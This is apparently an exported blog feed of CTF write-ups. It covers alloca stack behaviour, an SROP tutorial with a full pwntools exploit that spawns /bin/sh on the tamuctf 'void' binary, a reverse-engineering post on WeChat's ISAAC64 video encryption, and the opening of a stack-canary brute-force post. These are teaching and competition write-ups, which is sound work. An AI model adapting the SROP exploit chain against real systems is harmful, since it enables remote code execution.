    <title>first glance of alloca in ctf</title>
    <url>/articles/ctf/first-glance-of-alloca-in-ctf/</url>
    <content><![CDATA[<h1 id="0x1-background"><a href="#0x1-background" class="headerlink" title="0x1 background"></a>0x1 background</h1><p>when I was doing zeropts CTF 2022, I found a pwn question called accountant.</p>
<p>There is a line of code that use <code>alloca</code> to allocate memory. However, at that time, I didn&#39;t know that <code>alloca</code> allocate the memory on the stack. so I simply thought there is no bug... :(</p>
<p>later, Super Guesser publish their <a href="https://kileak.github.io/ctf/2022/zer0pts-accountant/">writeup</a> on accountant that point out that <code>alloca</code> allocate space on the stack. </p>
<p>So I could have a chance of looking at alloca.</p>
<span id="more"></span>

<h1 id="0x2-basic-idea"><a href="#0x2-basic-idea" class="headerlink" title="0x2 basic idea"></a>0x2 basic idea</h1><blockquote>
<p>The alloca() function allocates size bytes of space in the stack frame of the caller.  This temporary space is automatically freed when the function that called alloca() returns to its caller.<br><a href="https://www.mkssoftware.com/docs/man3/alloca.3.asp">https://www.mkssoftware.com/docs/man3/alloca.3.asp</a></p>
</blockquote>
<p>Basically, <code>alloca</code> allocate a space on the stack instead of heap.</p>
<p>Lets do some code to find out what <code>alloca</code> do. above is a example program. </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">void test() &#123;</span><br><span class="line">    long * ptr1 = (long *)0x1000;</span><br><span class="line">    long * ptr2 = (long *)0x1001;</span><br><span class="line">    // just some offset to make it clear</span><br><span class="line">    long x = 0x1002;</span><br><span class="line">    // lets alloca some space!</span><br><span class="line">    // normal alloca</span><br><span class="line">    ptr1 = (long *) alloca(sizeof(long));</span><br><span class="line">    *ptr1 = 0x2001;</span><br><span class="line">    ptr1 = (long *) alloca(sizeof(long));</span><br><span class="line">    *ptr1 = 0x2002;</span><br><span class="line">    // what if alloca 0</span><br><span class="line">    ptr2 = (long *) alloca(0);</span><br><span class="line">    *ptr2 = 0x2003;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    test();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>firstly, in assemble code <code>alloca</code> didn&#39;t appear to be a function. Instead, it appear with a set of instruction. So, the asm will <strong>not</strong> have any instruction like <code>call alloca</code>.</p>
<p>Before alloca is called, the stack looks very normal</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">:&gt; pxr @ rsp</span><br><span class="line">0x7fffe7ddb1d0 0x0000000000001000   ........ @ rsp 4096</span><br><span class="line">0x7fffe7ddb1d8 0x0000000000001001   ........ 4097</span><br><span class="line">0x7fffe7ddb1e0 0x0000000000001002   ........ 4098</span><br><span class="line">0x7fffe7ddb1e8 0x65ba763434aa8f00   ...44v.e</span><br><span class="line">0x7fffe7ddb1f0 0x00007fffe7ddb200   ........ @ rbp [stack] stack R W 0x0</span><br></pre></td></tr></table></figure>

<p>After program execute <code>*ptr = 0x2001</code>. Comparing with previous stack frame, We notice that that stack alloca extra <strong>16</strong> bytes above the initial stack.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">:&gt; pxr @ rsp</span><br><span class="line">0x7fffe7ddb1c0 0x0000000000002001   . ...... @ rax 8193</span><br><span class="line">0x7fffe7ddb1c8 0x000055756136632d   -c6auU.. /home/aynakeya/ctf/play/allocaa/a .text sym.__libc_csu_init program ascii (&#x27;-&#x27;) R X &#x27;add rbx, 1&#x27; &#x27;a&#x27;</span><br><span class="line">0x7fffe7ddb1d0 0x00007fffe7ddb1c0   ........ @ rcx [stack] rsp,rax stack R W 0x2001</span><br><span class="line">0x7fffe7ddb1d8 0x0000000000001001   ........ 4097</span><br><span class="line">0x7fffe7ddb1e0 0x0000000000001002   ........ 4098</span><br><span class="line">0x7fffe7ddb1e8 0x65ba763434aa8f00   ...44v.e</span><br><span class="line">0x7fffe7ddb1f0 0x00007fffe7ddb200   ........ @ rbp [stack] stack R W 0x0</span><br></pre></td></tr></table></figure>

<p>If we continue and execute <code>*ptr = 0x2002</code>. The it will also allocate <strong>16</strong> bytes of memory above the stack. This is because the stack need to be aligned with <code>0x10</code>. Since we only allocate 8 bytes, there need to be an extra 8 bytes padding in order to make the stack aligned.</p>
<p>Now, lets look what happens if we <code>alloc(0)</code>. </p>
<p>After execute <code>*ptr2 = 0x2003</code>. We found the value <code>0x2002</code> is replaced by <code>0x2003</code>. <code>ptr1</code> and <code>ptr2</code> are now pointing to a same address. Since </p>
<p><code>alloc(0)</code> actually return the current <code>rsp</code> address!</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">:&gt; pxr @ rsp</span><br><span class="line">0x7fffe7ddb1b0 0x0000000000002003   . ...... @ rax 8195</span><br><span class="line">0x7fffe7ddb1b8 0x00007fffe7ddb1e7   ........ [stack] stack R W 0xba763434aa8f0000</span><br><span class="line">0x7fffe7ddb1c0 0x0000000000002001   . ...... @ rsi 8193</span><br><span class="line">0x7fffe7ddb1c8 0x000055756136632d   -c6auU.. /home/aynakeya/ctf/play/allocaa/a .text sym.__libc_csu_init program ascii (&#x27;-&#x27;) R X &#x27;add rbx, 1&#x27; &#x27;a&#x27;</span><br><span class="line">0x7fffe7ddb1d0 0x00007fffe7ddb1b0   ........ @ rcx [stack] rsp,rax stack R W 0x2003</span><br><span class="line">0x7fffe7ddb1d8 0x00007fffe7ddb1b0   ........ [stack] rsp,rax stack R W 0x2003</span><br><span class="line">0x7fffe7ddb1e0 0x0000000000001002   ........ 4098</span><br><span class="line">0x7fffe7ddb1e8 0x65ba763434aa8f00   ...44v.e</span><br><span class="line">0x7fffe7ddb1f0 0x00007fffe7ddb200   ........ @ rbp [stack] stack R W 0x0</span><br></pre></td></tr></table></figure>

<h1 id="0x3-Some-thoughts"><a href="#0x3-Some-thoughts" class="headerlink" title="0x3 Some thoughts"></a>0x3 Some thoughts</h1><p>it is pretty interesting that there is a function that allocate memory on the stack. It seems very convenient compare to <code>malloc</code> if we just want use a memory space temporaryly. Since it will automatically freed after function exists, we don&#39;t need to worry about dangling pointer or memory leak.</p>
<p>But it is also kind of dangerous to use. For example, If we allocate 0 bytes, it would return current rsp address.</p>
<p>Also, when allocate larger space, we may run out of stack address if we use <code>alloca</code>.</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>Pwn - Sigreturn Oriented Programming (SROP) Technique</title>
    <url>/articles/ctf/pwn-srop-power-of-sigreturn/</url>
    <content><![CDATA[<h1 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h1><p>In recently ctf (tamuctf 2022), I solve a challenge called <strong>void</strong> (<a href="/ctf-writeup/2022/tamuctf/pwn/void/">writeup</a>). </p>
<p>This challenge only contains a few line of assembly code, with no libc and NX enabled.</p>
<p>The only thing we can utilize is a buffer overflow and some syscall gadget. </p>
<p>It seems impossible to do. However, there is a technique call <strong>SROP - Sigreturn Oriented Programming</strong> that can help us to pwn this binary.</p>
<h1 id="Theory"><a href="#Theory" class="headerlink" title="Theory"></a>Theory</h1><p>The original paper is here <a href="https://www.cs.vu.nl/~herbertb/papers/srop_sp14.pdf">paper</a>, <a href="https://tc.gtisc.gatech.edu/bss/2014/r/srop-slides.pdf">slides</a></p>
<p>Check it out if you want to.</p>
<p>I&#39;ll brief explain how SROP works.</p>
<span id="more"></span>

<h2 id="Before"><a href="#Before" class="headerlink" title="Before"></a>Before</h2><p><a href="https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md">syscall table</a></p>
<h2 id="Introduce-to-syscall-rt-sigreturn"><a href="#Introduce-to-syscall-rt-sigreturn" class="headerlink" title="Introduce to syscall - rt_sigreturn"></a>Introduce to syscall - rt_sigreturn</h2><p>Here is a picture showing how linux kernel handle signaling.</p>
<p><img data-src="/images/ctf/pwn-SROP-power-of-sigreturn/signal-handling-context.png" alt="signal-handling-context.png"></p>
<p>rt_sigreturn is a syscall the will be called when program come back from signal handler. </p>
<p>Since signal handler may change registers, before the program going to signal handler, the program will save current (which is called <strong>Signal Frame</strong>) state including all the register on the stack.</p>
<p><img data-src="/images/ctf/pwn-SROP-power-of-sigreturn/2022-04-17_224058.png" alt="2022-04-17_224058.png"></p>
<p>Then, after the program come back from signal handler, progrma will use syscall <strong>rt_sigreturn</strong> to recover register and continue running.</p>
<p>That said, if we can fake <strong>Signal Frame</strong> on the stack, then call <strong>rt_sigreturn</strong>.  we can set register to what ever value we want.</p>
<p>And here is what <strong>signal frame</strong> looks like in linux x86-64. (detail <a href="https://github.com/torvalds/linux/blob/master/arch/x86/include/uapi/asm/sigcontext.h">here</a>)</p>
<p><img data-src="/images/ctf/pwn-SROP-power-of-sigreturn/signal_frame.png" alt="signal_frame.png"></p>
<h2 id="How-to-trigger-sigreturn-in-the-first-place"><a href="#How-to-trigger-sigreturn-in-the-first-place" class="headerlink" title="How to trigger sigreturn in the first place."></a>How to trigger sigreturn in the first place.</h2><p>In order to trigger sigreturn and do a srop, the binary should satisfy following criteria</p>
<ol>
<li>Knowing the address of <code>syscall; ret</code></li>
<li>A big enough buffer overflow or something that allow us to write signal frame on the stack</li>
<li>some how control the value rax</li>
</ol>
<p>first and second criteria are easy to spot or identify. For setting the value in rax, there are multiple way to do that.</p>
<ol>
<li>using <code>pop rax; ret</code></li>
<li>using function a function return value (rax is used for function return)</li>
<li>using syscall read (syscall read will return how many bytes read)</li>
</ol>
<h2 id="Getting-a-shell-using-SROP"><a href="#Getting-a-shell-using-SROP" class="headerlink" title="Getting a shell using SROP"></a>Getting a shell using SROP</h2><p>To get a shell, we need to execute <code>execve(&#39;/bin/sh&#39;,0,0)</code> by calling <code>syscall</code></p>
<p>So, despite all the requirements describe above. We also need an address for <code>/bin/sh</code>.</p>
<p>If we have a buffer overflow or something, we either write <code>/bin/sh</code> into stack, or we can contruct a rop chain that write <code>/bin/sh</code> some where in the memory.</p>
<p>Pretty Straightforward</p>
<h1 id="Example-Void"><a href="#Example-Void" class="headerlink" title="Example - Void"></a>Example - Void</h1><p>Take the example from tamuctf 2022, my writeup <a href="/ctf-writeup/2022/tamuctf/pwn/void/">here</a>.</p>
<h2 id="Analyze"><a href="#Analyze" class="headerlink" title="Analyze"></a>Analyze</h2><p>Examining the code, the program only contains following codes. Basicly, the program call <code>main</code> and read 2000 bytes to the stack, then exit.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌ 27: int main (int argc, char **argv, char **envp);</span><br><span class="line">│           0x00401000      48c7c0000000.  mov rax, 0                  ; [02] -r-x section size 56 named .text</span><br><span class="line">│           0x00401007      48c7c7000000.  mov rdi, 0</span><br><span class="line">│           0x0040100e      4889e6         mov rsi, rsp</span><br><span class="line">│           0x00401011      48c7c2d00700.  mov rdx, 0x7d0              ; 2000</span><br><span class="line">│           0x00401018      0f05           syscall</span><br><span class="line">└           0x0040101a      c3             ret</span><br><span class="line">            0x0040101b      0f1f440000     nop dword [rax + rax]</span><br><span class="line">┌ 24: entry0 (int argc, char **argv, char **envp);</span><br><span class="line">│           0x00401020      31c0           xor eax, eax</span><br><span class="line">│           0x00401022      e8d9ffffff     call main                   ; int main(int argc, char **argv, char **envp)</span><br><span class="line">│           0x00401027      48c7c03c0000.  mov rax, 0x3c               ; &#x27;&lt;&#x27; ; 60</span><br><span class="line">│           0x0040102e      48c7c7000000.  mov rdi, 0</span><br><span class="line">│           0x00401035      0f05           syscall</span><br><span class="line">└           0x00401037      c3             ret</span><br></pre></td></tr></table></figure>

<p>And there is no writable memory page except the stack.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x0000000000400000 - 0x0000000000401000 - usr     4K s r-- void void ; segment.ehdr</span><br><span class="line">0x0000000000401000 - 0x0000000000402000 * usr     4K s r-x void void ; map.void.r_x</span><br><span class="line">0x0000000000402000 - 0x0000000000403000 - usr     4K s r-- void void ; map.void.r__</span><br><span class="line">0x00007ffe3e60d000 - 0x00007ffe3e62e000 - usr   132K s rw- [stack] [stack] ; map._stack_.rw_</span><br><span class="line">0x00007ffe3e64f000 - 0x00007ffe3e653000 - usr    16K s r-- [vvar] [vvar] ; map._vvar_.r__</span><br><span class="line">0x00007ffe3e653000 - 0x00007ffe3e654000 - usr     4K s r-x [vdso] [vdso] ; map._vdso_.r_x</span><br></pre></td></tr></table></figure>

<p>So, how to use <strong>SROP</strong> to get a shell? Lets think reversely.</p>
<p>In the end, we want to get a shell, so we must use <code>syscall(59,&#39;/bin/sh&#39;,0,0)</code>. But &#39;&#x2F;bin&#x2F;sh&#39; is not in the memory. So, we need to write &#39;&#x2F;bin&#x2F;sh&#39; into the memory.</p>
<p>We can simply write &#39;&#x2F;bin&#x2F;sh&#39; on the stack, <strong>however</strong>, there is no way we are able to know the stack address. (In this case, rdi never gonna be 1, so we can&#39;t use <code>write(1,addr,0x7df)</code> to get stack address)</p>
<p>Here is another method, first, we do a <code>mprotect</code> to make a memory page writable using sigreturn. After sigreturn, rsp (stack pointer) will set to the address now is writable. </p>
<p>Then we return to <code>main</code> function and write &#39;&#x2F;bin&#x2F;sh&#39; and signal frame for calling <code>syscall(59,&#39;/bin/sh&#39;,0,0)</code> there. In that case, we know the address of &#39;&#x2F;bin&#x2F;sh&#39;.</p>
<p>Now, how to trigger sigreturn? thats pretty straightforward, Since we have a write syscall in main, we just write 15 bytes to the stack and return to syscall gadget. That will set rax to 15 and trigger sigreturn.</p>
<p>There one more thing. Since we are using the gadget <code>syscall; ret</code>. After we execute <code>mprotect</code>, the program will ret to a address in the rsp. </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Before sigreturn</span><br><span class="line"></span><br><span class="line">registers: rax = 15, rsp = 0xffff1000</span><br><span class="line"></span><br><span class="line">syscall &lt;- rip</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">----</span><br><span class="line">fake signal frame &lt;- rsp = 0xffff1000</span><br><span class="line">rsp = some value(eg. 0xffff4000)</span><br><span class="line">rax = 10</span><br><span class="line">rip = syscall address</span><br><span class="line">....</span><br><span class="line">----</span><br><span class="line"></span><br><span class="line">=======================================</span><br><span class="line"></span><br><span class="line">After sigreturn</span><br><span class="line"></span><br><span class="line">registers: rax = 10, rsp = 0xffff4000</span><br><span class="line"></span><br><span class="line">syscall &lt;- rip # this syscall the do mprotect</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">----</span><br><span class="line">unknown stuff &lt;- rsp = 0xffff4000</span><br><span class="line">----</span><br><span class="line"></span><br><span class="line">=======================================</span><br><span class="line"></span><br><span class="line">syscall</span><br><span class="line">ret  &lt;- rip </span><br><span class="line"></span><br><span class="line">----</span><br><span class="line">unknown stuff &lt;- rsp = 0xffff4000</span><br><span class="line">----</span><br></pre></td></tr></table></figure>

<p>Its okay if we end after one sigreturn. But in this case, we need to do two sigreturn, so it is important to return back to <code>main</code>. Therefore, we need find some where in the memory that contains an pointer to <code>main</code>, so that when <code>ret</code> is called, it will go back to <code>main</code> and we can do another SROP there.</p>
<p>Luckily, in <code>0x004020b8</code>, there is pointer that point to <code>main</code>. So we can happily make whole <code>0x00402000-0x00403000</code> page writable and use this address as our new rsp.</p>
<h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><ol>
<li>write signal frame to the stack with rax&#x3D;10 (mprotect), rdi &#x3D; 0x00402000, rsi &#x3D; 0x1000, rdx &#x3D; 7 (rwx), rsp &#x3D; 0x004020b8, rip &#x3D; syscall addr. Then return to main</li>
<li>write 15 bytes to trigger sigreturn</li>
<li>syscall <code>mprotect(0x00402000,0x1000,7)</code></li>
<li>return to main, write signal frame for calling execve. Then return to main</li>
<li>write 15 bytes to trigger sigreturn</li>
<li>syscall <code>execve(&#39;/bin/sh&#39;,0,0)</code> to get a shell</li>
</ol>
<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class BinaryInfo:</span><br><span class="line">    exe = &quot;void&quot;</span><br><span class="line">    libc = &quot;&quot;</span><br><span class="line"></span><br><span class="line">    host = &quot;rua.host.goes.here&quot;</span><br><span class="line">    port = 8000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exe = context.binary = ELF(BinaryInfo.exe)</span><br><span class="line">exe_rop = ROP(exe)</span><br><span class="line">if BinaryInfo.libc != &quot;&quot;:</span><br><span class="line">    libc = ELF(BinaryInfo.libc)</span><br><span class="line">    libc_rop = ROP(libc)</span><br><span class="line">else:</span><br><span class="line">    libc = None</span><br><span class="line">    libc_rop = None</span><br><span class="line"></span><br><span class="line">host = args.HOST or BinaryInfo.host</span><br><span class="line">port = int(args.PORT or BinaryInfo.port)</span><br><span class="line"></span><br><span class="line">def start_local(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Execute the target binary locally&#x27;&#x27;&#x27;</span><br><span class="line">    if args.GDB:</span><br><span class="line">        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return process([exe.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def start_remote(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Connect to the process on the remote host&#x27;&#x27;&#x27;</span><br><span class="line">    io = remote(&quot;tamuctf.com&quot;, 443, ssl=True, sni=&quot;void&quot;)</span><br><span class="line">    if args.GDB:</span><br><span class="line">        gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line">    return io</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def start(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Start the exploit against the target.&#x27;&#x27;&#x27;</span><br><span class="line">    if args.LOCAL:</span><br><span class="line">        return start_local(argv, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return start_remote(argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ===========================================================</span><br><span class="line">#                    EXPLOIT GOES HERE</span><br><span class="line"># ===========================================================</span><br><span class="line">#    Arch:     amd64-64-little</span><br><span class="line">#    RELRO:    No RELRO</span><br><span class="line">#    Stack:    No canary found</span><br><span class="line">#    NX:       NX enabled</span><br><span class="line">#    PIE:      No PIE (0x400000)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line"># rax syscall x64</span><br><span class="line"># 0   read</span><br><span class="line"># 1   write</span><br><span class="line"># 15  rt_sigreturn</span><br><span class="line"># 59  execve</span><br><span class="line"></span><br><span class="line">main_addr = exe.sym[&quot;main&quot;]</span><br><span class="line">syscall_ret_addr = 0x00401018</span><br><span class="line">fake_rwx_stack_addr = 0x004020b8</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mprotect_frame = SigreturnFrame()</span><br><span class="line">mprotect_frame.rip = syscall_ret_addr # return to main and do other thing</span><br><span class="line">mprotect_frame.rsp = fake_rwx_stack_addr</span><br><span class="line">mprotect_frame.rax = constants.SYS_mprotect</span><br><span class="line">mprotect_frame.rdi = 0x00402000</span><br><span class="line">mprotect_frame.rsi = 0x1000</span><br><span class="line">mprotect_frame.rdx = 7 # rwx</span><br><span class="line"></span><br><span class="line">do_mprotect = flat(&#123;</span><br><span class="line">    0:[</span><br><span class="line">        main_addr,</span><br><span class="line">        syscall_ret_addr,</span><br><span class="line">        bytes(mprotect_frame)</span><br><span class="line">    ]</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">input(&quot;send mprotect payload&quot;)</span><br><span class="line">io.send(do_mprotect) # set up sigreturn frame</span><br><span class="line">input(&quot;trigger sigreturn and mprotect&quot;)</span><br><span class="line">io.send(do_mprotect[8:8+15]) # read 15 bytes, trigger sigreturn</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">execve_bin_sh_frame = SigreturnFrame()</span><br><span class="line">execve_bin_sh_frame.rip = syscall_ret_addr # return to main and do other thing</span><br><span class="line">execve_bin_sh_frame.rsp = fake_rwx_stack_addr # </span><br><span class="line">execve_bin_sh_frame.rax = constants.SYS_execve</span><br><span class="line">execve_bin_sh_frame.rdi = fake_rwx_stack_addr +8+ len(flat(&#123;0:[main_addr,syscall_ret_addr,bytes(execve_bin_sh_frame)]&#125;))</span><br><span class="line">execve_bin_sh_frame.rsi = 0</span><br><span class="line">execve_bin_sh_frame.rdx = 0</span><br><span class="line"></span><br><span class="line">do_execve_bin_sh = flat(&#123;</span><br><span class="line">    0:[</span><br><span class="line">        main_addr,</span><br><span class="line">        syscall_ret_addr,</span><br><span class="line">        bytes(execve_bin_sh_frame),</span><br><span class="line">        b&quot;/bin/sh\x00&quot;,</span><br><span class="line">    ]</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">input(&quot;send execve bin/sh payload&quot;)</span><br><span class="line">io.send(do_execve_bin_sh) # set up sigreturn frame</span><br><span class="line">input(&quot;trigger sigreturn and mprotect&quot;)</span><br><span class="line">io.send(do_execve_bin_sh[8:8+15]) # read 15 bytes, trigger sigreturn</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>


<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference:"></a>Reference:</h1><ol>
<li><a href="https://www.2cto.com/article/201512/452080.html">https://www.2cto.com/article/201512/452080.html</a></li>
</ol>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>writeup</tag>
        <tag>srop</tag>
      </tags>
  </entry>
  <entry>
    <title>用OSINT的方法逆向加密算法 - WxIsaac64</title>
    <url>/articles/ctf/reverse-encryption-algorithm-by-osint-wxisaac64/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>书接上回 <a href="/articles/ctf/wechat-video-encryption-reverse-engineer/">微信视频号视频加密逆向</a>。在之前的一篇文章中，我们留下了一个问题，就是WxIsacc64这个加密算法到底是怎么个回事捏。</p>
<p>虽然名字已经很清楚了，必然是ISAAC64算法，但是他具体是怎么生成的捏，今天我们就来一起逆向吧。</p>
<span id="more"></span>

<h1 id="具体过程"><a href="#具体过程" class="headerlink" title="具体过程"></a>具体过程</h1><p>那么要怎么开始呢。</p>
<p>在机缘巧合之下(fuzzy testing)，我把一个巨大的值作为seed传入了生成解密序列的函数，然后我就得到了一个很有用的报错<code> stoull: out of range</code></p>
<p><img data-src="/images/reverse-encryption-algorithm-by-osint-wxisaac64/image-20240130005313592.png" alt="image-20240130005313592"></p>
<p><code>stoull</code>是啥，简单来说就是把字符串变成一个<code>unsigned long long</code>。从这边我们其实可以得到几个非常重要的信息。</p>
<ol>
<li>他的isaac64有很大的概率是通过一个c（或者类c的语言，比如c++）程序实现的。通过把c程序编译成wasm来让网页调用</li>
<li>在传入seed的时候，seed有很大的可能会被变成<code>unsigned long long</code>然后再传入。</li>
<li>他给了我们一个call stack，我们可以根据这个call stack来寻找相对应的函数</li>
</ol>
<p>那么在了解了这些信息后，我们就可以开始进一步逆向啦。</p>
<h2 id="Wasm侦探，认真办案！"><a href="#Wasm侦探，认真办案！" class="headerlink" title="Wasm侦探，认真办案！"></a>Wasm侦探，认真办案！</h2><p>在这个call stack中有一个非常重要的函数，就是<code>$688</code>。这个函数不仅在名字上和他的callee差了一个数字，更是报错开始的地方。</p>
<p><img data-src="/images/reverse-encryption-algorithm-by-osint-wxisaac64/image-20240130012444924.png" alt="image-20240130012444924"></p>
<p>如果我们使用一个正常的seed，也就是<code>12312312</code>。 在<code>$688</code>函数中，程序会调用<code>$3478</code>，他的返回值正好是数字<code>12312312</code>。</p>
<p>但如果我们使用一个不正常的seed，比如<code>&quot;9&quot; * 100</code>。程序在调用<code>$3478</code>函数的时候就会报错，完全走不到下一步。</p>
<p>由此，我们可以合理推测 <code>$3478</code>就是<code>stoull</code>函数。</p>
<p><img data-src="/images/reverse-encryption-algorithm-by-osint-wxisaac64/Screenshot_20240130_011941.png" alt="Screenshot_20240130_011941"></p>
<p>接着，我们继续往下翻，发现<code>$688</code>，调用了另外一个有趣的函数<code>$687</code>。他给$687传了一个地址。</p>
<p>如果我们在内存中查看这个地址，可以发现他正好代表了我们输入的数字。比如在这就是123123123 &#x3D; 0x0756b5b3。</p>
<p>他把转换成的数字的地址传给了<code>$687</code>，很明显，这就是在传我们的seed啊！</p>
<p><img data-src="/images/reverse-encryption-algorithm-by-osint-wxisaac64/Screenshot_20240130_014211.png" alt="Screenshot_20240130_014211"></p>
<p>我们把<code>$687</code>函数单独提出来运行看看</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="title class_">HEAP32</span> = <span class="keyword">new</span> <span class="title class_">Int32Array</span>(<span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">1</span> &lt;&lt; <span class="number">24</span>));</span><br><span class="line"><span class="comment">// 18446744073709551615 = 0xffffffffffffffff</span></span><br><span class="line"><span class="title class_">HEAP32</span>[<span class="number">0</span>] = -<span class="number">1</span>;</span><br><span class="line"><span class="title class_">HEAP32</span>[<span class="number">1</span>] = -<span class="number">1</span>;</span><br><span class="line">$687(<span class="number">0</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>诶，0x7c &#x3D; 124, 0x38 &#x3D; 56, 0xf9 &#x3D; 253。这不是我们的的解密序列嘛！</p>
<p>看起来我们找到关键函数了，就是<code>$687</code></p>
<p><img data-src="/images/reverse-encryption-algorithm-by-osint-wxisaac64/image-20240130015427371.png" alt="image-20240130015427371"></p>
<h2 id="重生之我是OSINT大神"><a href="#重生之我是OSINT大神" class="headerlink" title="重生之我是OSINT大神"></a>重生之我是OSINT大神</h2><p><code>$687</code>中有一些非常有有趣的值</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">$687</span>(<span class="params">$0_1, $1_1</span>) &#123;</span><br><span class="line">  $0_1 = $0_1 | <span class="number">0</span>;</span><br><span class="line">  $1_1 = $1_1 | <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">var</span> i64toi32_i32$1 = <span class="number">0</span>,<span class="comment">// ........  ignored;</span></span><br><span class="line">  <span class="comment">// ......</span></span><br><span class="line">  i64toi32_i32$0 = <span class="number">1685866103</span>;</span><br><span class="line">  $177_1 = -<span class="number">1568126084</span>;</span><br><span class="line">  $177$hi = i64toi32_i32$0;</span><br><span class="line">  i64toi32_i32$0 = -<span class="number">1174883550</span>;</span><br><span class="line">  <span class="comment">//...  ignored</span></span><br></pre></td></tr></table></figure>

<p>比如通过<code>1685866103</code>，我们可以知道stack上存在一连串非常有特点的值。我的直觉告诉我，这些值很有可能和加密算法有关。</p>
<p>比如这个 <code>0x647c4677a2884b7c</code></p>
<p><img data-src="/images/reverse-encryption-algorithm-by-osint-wxisaac64/Screenshot_20240130_020213.png" alt="Screenshot_20240130_020213"></p>
<p>那么，开始<strong>OSINT</strong></p>
<p>啊这................</p>
<p><img data-src="/images/reverse-encryption-algorithm-by-osint-wxisaac64/Screenshot_20240130_020649.png" alt="Screenshot_20240130_020649"></p>
<p>啊这这这这这这这这这这。。。。。。。。。。。。。。</p>
<p><img data-src="/images/reverse-encryption-algorithm-by-osint-wxisaac64/image-20240130021256004.png" alt="image-20240130021256004"></p>
<p>这不是一模一样嘛啊喂喂喂喂喂喂喂喂喂喂喂喂喂喂喂喂喂喂！！！！！！！！！11</p>
<p>好了，这下直接复制粘贴代码就好了</p>
<h1 id="写在后面"><a href="#写在后面" class="headerlink" title="写在后面"></a>写在后面</h1><p>其实这个算法我在写完那篇文章后就逆向出来，但是由于各种原因一直没时间写。</p>
<p>今天总算是挤出来一些时间把这篇博客写了。也算是把这个逆向计划补完了。</p>
<p>不过这篇确实有点点水，因为大部分时间都花在debugging上了，就是找哪个函数是关键函数。这部分要是写进博客里就太无聊了，于是我就没写。</p>
<p>不管怎么样，完结散花 ～～～～～</p>
<p>一些杂七杂八的东西：</p>
<p><code>0x647c4677a2884b7c</code>其实是golden ratio constant的一部分。很多别的isaa64算法用了近似值也就是<code>0x9e3779b97f4a7c13</code>来计算。这导致了算法生成的结果不太一样。</p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ol>
<li>coreutils: <a href="https://github.com/coreutils/coreutils">https://github.com/coreutils/coreutils</a></li>
</ol>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>reverse</tag>
      </tags>
  </entry>
  <entry>
    <title>[pwn] what is canary and how to bruteforce it [MapleCTF2022]</title>
    <url>/articles/ctf/maplectf2022-pwn-bruteforcing-canary/</url>
    <content><![CDATA[<h1 id="0x0-Introduction"><a href="#0x0-Introduction" class="headerlink" title="0x0 Introduction"></a>0x0 Introduction</h1><p>In maple ctf 2022 (more write up at <a href="/2022/01/28/maple-ctf-2022-write-up/">here</a>). There is a quesiton require bruteforcing canary</p>
<p>To be honest, this is the first time I got practice on brute-forcing canary.</p>
<h1 id="0x1-What-is-Canary"><a href="#0x1-What-is-Canary" class="headerlink" title="0x1 What is Canary"></a>0x1 What is Canary</h1><p>so, before talking about brute force canary. What is <strong>canary</strong></p>
<p>Basically, canary is a mitigation that prevent buffer overflow. Since buffer over utilize the overflow the variable on the stack to overwrite rbp and rip. This could help attacker to execute arbitrary code by constructing a rop chain or something. The canary can help prevent simple buffer overflow by put a cookie just above the RBP.</p>
<span id="more"></span>

